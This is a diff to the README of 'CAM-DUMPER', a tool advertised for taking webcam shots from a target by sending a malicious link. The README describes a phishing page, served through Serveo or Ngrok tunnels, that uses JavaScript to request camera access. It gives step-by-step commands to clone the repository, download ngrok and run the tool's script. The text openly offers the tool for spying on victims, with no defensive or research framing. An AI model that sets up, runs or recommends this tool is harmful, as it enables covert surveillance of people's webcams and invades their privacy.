@@ -1,7 +1,6 @@
-
-# CAM-DUMPER
-Take webcam shots from target by just sending a malicious link
-
+<h1 text-align="center">CAM-DUMPER</h1>
+<img src="cd.jpg" width="100%" height="auto">
+<p text-align="center">Take webcam shots from target by just sending a malicious link</p>
 # How it works?
 <p>The tool generates a malicious HTTPS page using Serveo or Ngrok Port Forwarding methods, and a javascript code to cam requests using MediaDevices.getUserMedia. </p>
 
@@ -17,9 +16,11 @@ $ apt install git
 $ apt install php wget
 $ git clone https://github.com/LiNuX-Mallu/CAM-DUMPER.git
 $ cd CAM-DUMPER
-$ wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip && unzip *.zip && rm *.zip
-$ chmod +x camdumper.sh ngrok
 
+<p>(replace this link with version suitable for yours from <a href="https://ngrok.com/download">here</a></p>
+$ wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip && unzip *.zip && rm *.zip
+
+$ chmod +x camdumper.sh ngrok
 $ bash camdumper.sh
 
 ```
